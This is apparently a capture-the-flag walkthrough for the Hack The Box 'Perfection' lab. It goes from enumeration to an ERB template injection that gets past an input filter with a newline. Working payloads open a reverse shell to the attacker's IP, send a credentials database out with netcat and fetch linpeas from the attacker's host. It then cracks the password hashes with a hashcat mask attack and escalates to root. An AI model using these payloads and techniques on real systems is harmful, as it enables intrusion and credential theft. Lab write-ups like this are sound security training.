# Perfection - Easy

```sh
sudo vim /etc/hosts
# add perfection.htb

nmap -T4 -p- -A -Pn -v perfection.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
    * 80/tcp - http - nginx

* the webpage is titled 'Weighted Grade Calculator', and provides a tool to calculate weighted grade

* ```wappalyzer``` shows the webapp is built using Ruby 3.0.2

* the about section gives us two names 'Tina Smith' & 'Susan Miller', and the footer of the webpage shows that the app is using 'WEBrick 1.7.0'

* Googling about this shows that WEBrick is a Ruby library providing HTTP server functionality; but there are no exploits associated with this version

* web enum:

    ```sh
    gobuster dir -u http://perfection.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 25
    # dir scan

    ffuf -c -u 'http://perfection.htb' -H 'Host: FUZZ.perfection.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 3842 -s
    # subdomain scan
    ```

* checking the tool, it has five rows and three columns (category, grade, weight%); the page mentions to enter 'N/A' into the category fields, and 0 in grade & weight fields if a row is not used - this means there could be lesser checks in the backend

* the source code shows a POST call is done to '/weighted-grade-calc', but no other info is provided

* we can intercept a valid request in Burp Suite to check the request

* the data sent for the POST request is in this format:

    ```sh
    category1=test&grade1=85&weight1=20&category2=test&grade2=89&weight2=20&category3=test&grade3=12&weight3=10&category4=test&grade4=90&weight4=30&category5=test&grade5=60&weight5=20
    ```

* we can check for any injection attacks by fuzzing these parameters - as the grade & weight fields check for numbers, we can fuzz the category fields using ```ffuf```

* in Burp Suite Repeater, right-click on the POST request and 'copy to file', then replace the category field values with 'FUZZ' for using with ```ffuf```

* parameter value fuzzing with different wordlists:

    ```sh
    ffuf -u 'http://perfection.htb/weighted-grade-calc' -request test.req -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -fw 1174,1181

    ffuf -u 'http://perfection.htb/weighted-grade-calc' -request test.req -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -fw 1174,1181
    ```

* the response from the wordlist shows a lot of payloads - many of these include URL-encoded strings such as '%0a' (newline), '%20' (space), '%3b' (semicolon), etc.

* so we can attempt for manual injection to confirm this - we can use the following URL-encoded characters in the category field to see if it is interpreted:

    * ```%0a``` - ```\n```
    * ```%20``` - space
    * ```%3b``` - ```;```
    * ```%26``` - ```&```
    * ```%7c``` - ```|```
    * ```%26%26``` - ```&&```
    * ```%60%60``` - backticks
    * ```%24%28%29``` - ```$()```

* except for newline and space, other URL-encoded forms (and the normal, URL-decoded characters) are detected by the webapp and it prints 'Malicious input blocked'

* if we use ```%0a``` (newline) without any characters, the webapp is still able to detect it - but if we use it before or after any string, it is not detected

* ```%20``` (space) is not detected by the filter, even without any strings before/after it

* however, using ```%20``` with any other blacklisted chars like '$', '&', '.' fails and the webapp detects the malicious chars - this does not happen with URL-encoded newline

* we can now continue manual testing in Burp Suite, with the category field value having a URL-encoded newline character prefixed with a string, like ```test%0aFUZZ``` - where 'FUZZ' marks our payload

* as the webapp uses Ruby, we can use Ruby-specific payloads in addition to the usual payloads, from [this list for common injection attacks](https://github.com/swisskyrepo/PayloadsAllTheThings) like:

    * [command injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) - this does not work

    * [SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) - this does not work

    * [SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md) - this works using 'erb' template payloads

* testing for SSTI (server side template injection) payloads for Ruby template 'erb' works - ```<%=7*7%>``` is the payload, when URL-encoded with the rest of the payload ```test%0a<%25%3d7*7%25>```, gives '49' in the result

* we can test for RCE now using the given payload examples - setup a listener for pings using ```sudo tcpdump -i tun0 icmp```

* if we use the RCE payload - ```test%0a<%25%3dsystem('ping+-c+4+10.10.14.8')%25>``` - this executes the command ```ping -c 4 10.10.14.8``` on the target, and we can see the ICMP packets hit our listener

* we can now use this to get reverse shell - setup a listener with ```nc -nvlp 4444```

* we can use this payload in the category field - ```test%0a<%25%3dsystem('busybox+nc+10.10.14.8+4444+-e+sh')%25>``` - this executes the command ```busybox nc 10.10.14.8 4444 -e sh```, and we are able to get reverse shell:

    ```sh
    id
    # user 'susan'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to bg shell
    stty raw -echo; fg
    # Enter twice

    pwd
    # /home/susan/ruby_app

    ls -la
    # check app code

    cd
    # go to /home/susan

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # needs password

    # check the non-default folder
    ls -la Migration
    # this includes a .db file

    which nc
    # available on box
    ```

* there is a '.db' file that can be checked further - we can transfer this to attacker:

    ```sh
    # on attacker
    nc -nvlp 5555 > target.db
    ```

    ```sh
    # on target
    nc 10.10.14.8 5555 -w 3 < Migration/pupilpath_credentials.db
    ```

    ```sh
    # on attacker
    # verify the file has been transferred correctly

    # check the DB file
    sqlite3 target.db

    .tables
    # check tables - this shows 'users' table

    select * from users;
    ```

* the '.db' file contains hashes for five users, including 'susan'; hash identifier tools show that these are SHA256 hashes

* ```hashcat``` docs show that SHA256 hashes are supported by mode 1400 - we can attempt to crack these hashes:

    ```sh
    vim sha256hashes.txt
    # paste all hashes

    hashcat -m 1400 sha256hashes.txt /usr/share/wordlists/rockyou.txt --force
    ```

* ```hashcat``` cannot crack the hashes so we need to continue our enumeration

* we can enumerate using ```linpeas```:

    ```sh
    # fetch script from attacker
    wget http://10.10.14.8:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.15.0-97-generic, Ubuntu 22.04
    * sudo version 1.9.9
    * 'susan' is part of sudo group
    * mail files found at ```/var/mail/susan```

* checking the mail file ```/var/mail/susan```, we get info on a databreach for 'PupilPath', and includes the new password format - ```{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}``` - with lowercase letters

* as we have the password format now, we can crack the hash for 'susan' - we can use ```hashcat``` to generate the pattern on the fly using the [mask attack](https://hashcat.net/wiki/doku.php?id=mask_attack):

    ```sh
    # on attacker
    vim susanhash
    # paste the hash for susan separately

    hashcat -a 3 -m 1400 susanhash "susan_nasus_?d?d?d?d?d?d?d?d?d"
    # '?d' for digits, added 9 times
    # as it could be a random 9-digit number
    ```

* this cracks the password to give cleartext 'susan_nasus_413759210' - we can now login as 'susan' via SSH:

    ```sh
    ssh susan@perfection.htb

    sudo -l
    # (ALL : ALL) ALL
    # we can run all commands as all users

    sudo bash
    # this gives root shell

    cat /root/root.txt
    # root flag
    ```
